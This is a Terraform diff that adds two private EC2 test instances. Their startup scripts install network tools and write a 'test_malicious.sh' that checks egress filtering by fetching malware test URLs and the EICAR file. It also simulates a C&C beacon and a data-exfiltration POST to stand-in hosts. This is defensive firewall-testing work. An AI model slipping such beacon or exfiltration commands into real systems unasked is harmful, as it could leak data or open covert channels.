@@ -309,6 +309,164 @@ EOT
   }
 }
 
+# Private EC2 Instances for Security Testing
+# ----------------------------------------------------------
+resource "aws_instance" "private_instance1" {
+  associate_public_ip_address = false
+  availability_zone           = var.aws_availability_zone1
+  ami                         = data.aws_ami.ubuntu2204.id
+  iam_instance_profile        = aws_iam_instance_profile.spoke_instance_profile.name
+  instance_type               = "t2.micro"
+  key_name                    = var.aws_ssh_key_pair_name
+  user_data                   = <<EOT
+#!/bin/bash
+sudo apt-get update
+sudo apt-get install -y curl wget nmap dnsutils netcat-openbsd
+sudo apt-get install -y apache2
+FQDN=$(hostname -f)
+LOCALIP=$(hostname -I | awk '{print $1}')
+AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
+cat <<EOF > /var/www/html/index.html
+<html><body>
+<h2>Private EC2 Instance Info (AZ1)</h2>
+<p>FQDN: $FQDN</p>
+<p>Internal IP: $LOCALIP</p>
+<p>AZ: $AZ</p>
+<p>Role: Security Testing Instance</p>
+</body></html>
+EOF
+
+# Create test scripts for security testing
+cat <<'SCRIPT' > /home/ubuntu/test_internet.sh
+#!/bin/bash
+echo "=== Internet Connectivity Test ==="
+echo "Testing basic connectivity..."
+curl -s http://httpbin.org/ip
+echo ""
+echo "Testing DNS resolution..."
+nslookup google.com
+echo ""
+echo "Testing HTTPS..."
+curl -s https://httpbin.org/get | head -20
+SCRIPT
+
+cat <<'SCRIPT' > /home/ubuntu/test_malicious.sh
+#!/bin/bash
+echo "=== Malicious URL/IP Testing ==="
+echo "WARNING: These are test URLs/IPs for security testing"
+echo ""
+
+# Test known malicious domains (EICAR test domains)
+echo "Testing potentially malicious domains..."
+curl -s --connect-timeout 5 http://malware.testing.google.test/testing/malware/ || echo "Blocked or failed"
+curl -s --connect-timeout 5 http://testsafebrowsing.appspot.com/s/malware.html || echo "Blocked or failed"
+
+# Test suspicious file downloads
+echo "Testing suspicious file downloads..."
+curl -s --connect-timeout 5 -o /tmp/eicar.txt http://www.eicar.org/download/eicar.com.txt || echo "Download blocked or failed"
+
+# Test command and control simulation
+echo "Testing C&C simulation..."
+curl -s --connect-timeout 5 http://example.com:8080/beacon || echo "Connection blocked or failed"
+
+# Test data exfiltration simulation
+echo "Testing data exfiltration patterns..."
+curl -s --connect-timeout 5 -X POST -d "sensitive_data=test123" http://suspicious-domain.example || echo "POST blocked or failed"
+SCRIPT
+
+chmod +x /home/ubuntu/test_*.sh
+chown ubuntu:ubuntu /home/ubuntu/test_*.sh
+
+# Install additional security testing tools
+sudo apt-get install -y ncat socat tcpdump
+EOT
+  subnet_id                   = aws_subnet.sample_private_subnet1.id
+  vpc_security_group_ids      = [aws_security_group.sample_security_group.id]
+  tags = {
+    Name = "${var.prefix}-z1-private-test"
+    Category = "security-testing"
+    Environment = "private"
+  }
+}
+
+resource "aws_instance" "private_instance2" {
+  associate_public_ip_address = false
+  availability_zone           = var.aws_availability_zone2
+  ami                         = data.aws_ami.ubuntu2204.id
+  iam_instance_profile        = aws_iam_instance_profile.spoke_instance_profile.name
+  instance_type               = "t2.micro"
+  key_name                    = var.aws_ssh_key_pair_name
+  user_data                   = <<EOT
+#!/bin/bash
+sudo apt-get update
+sudo apt-get install -y curl wget nmap dnsutils netcat-openbsd
+sudo apt-get install -y apache2
+FQDN=$(hostname -f)
+LOCALIP=$(hostname -I | awk '{print $1}')
+AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
+cat <<EOF > /var/www/html/index.html
+<html><body>
+<h2>Private EC2 Instance Info (AZ2)</h2>
+<p>FQDN: $FQDN</p>
+<p>Internal IP: $LOCALIP</p>
+<p>AZ: $AZ</p>
+<p>Role: Security Testing Instance</p>
+</body></html>
+EOF
+
+# Create test scripts for security testing
+cat <<'SCRIPT' > /home/ubuntu/test_internet.sh
+#!/bin/bash
+echo "=== Internet Connectivity Test ==="
+echo "Testing basic connectivity..."
+curl -s http://httpbin.org/ip
+echo ""
+echo "Testing DNS resolution..."
+nslookup google.com
+echo ""
+echo "Testing HTTPS..."
+curl -s https://httpbin.org/get | head -20
+SCRIPT
+
+cat <<'SCRIPT' > /home/ubuntu/test_malicious.sh
+#!/bin/bash
+echo "=== Malicious URL/IP Testing ==="
+echo "WARNING: These are test URLs/IPs for security testing"
+echo ""
+
+# Test known malicious domains (EICAR test domains)
+echo "Testing potentially malicious domains..."
+curl -s --connect-timeout 5 http://malware.testing.google.test/testing/malware/ || echo "Blocked or failed"
+curl -s --connect-timeout 5 http://testsafebrowsing.appspot.com/s/malware.html || echo "Blocked or failed"
+
+# Test suspicious file downloads
+echo "Testing suspicious file downloads..."
+curl -s --connect-timeout 5 -o /tmp/eicar.txt http://www.eicar.org/download/eicar.com.txt || echo "Download blocked or failed"
+
+# Test command and control simulation
+echo "Testing C&C simulation..."
+curl -s --connect-timeout 5 http://example.com:8080/beacon || echo "Connection blocked or failed"
+
+# Test data exfiltration simulation
+echo "Testing data exfiltration patterns..."
+curl -s --connect-timeout 5 -X POST -d "sensitive_data=test123" http://suspicious-domain.example || echo "POST blocked or failed"
+SCRIPT
+
+chmod +x /home/ubuntu/test_*.sh
+chown ubuntu:ubuntu /home/ubuntu/test_*.sh
+
+# Install additional security testing tools
+sudo apt-get install -y ncat socat tcpdump
+EOT
+  subnet_id                   = aws_subnet.sample_private_subnet2.id
+  vpc_security_group_ids      = [aws_security_group.sample_security_group.id]
+  tags = {
+    Name = "${var.prefix}-z2-private-test"
+    Category = "security-testing"
+    Environment = "private"
+  }
+}
+
 # 6. Application Load Balancers (Public & Private)
 # ----------------------------------------------------------
 resource "aws_lb" "sample_alb_public" {
